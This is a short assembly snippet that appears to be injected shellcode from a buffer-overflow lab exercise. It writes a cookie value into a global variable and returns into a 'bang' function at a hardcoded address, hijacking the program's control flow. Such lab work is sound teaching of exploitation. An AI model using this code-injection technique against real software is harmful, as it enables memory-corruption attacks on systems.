mov 0x804d108, %eax /* move cookie value to eax */
mov %eax, 0x804d100 /* move cookie value to global_value position */
push $0x8048c9d/* bang position */
ret

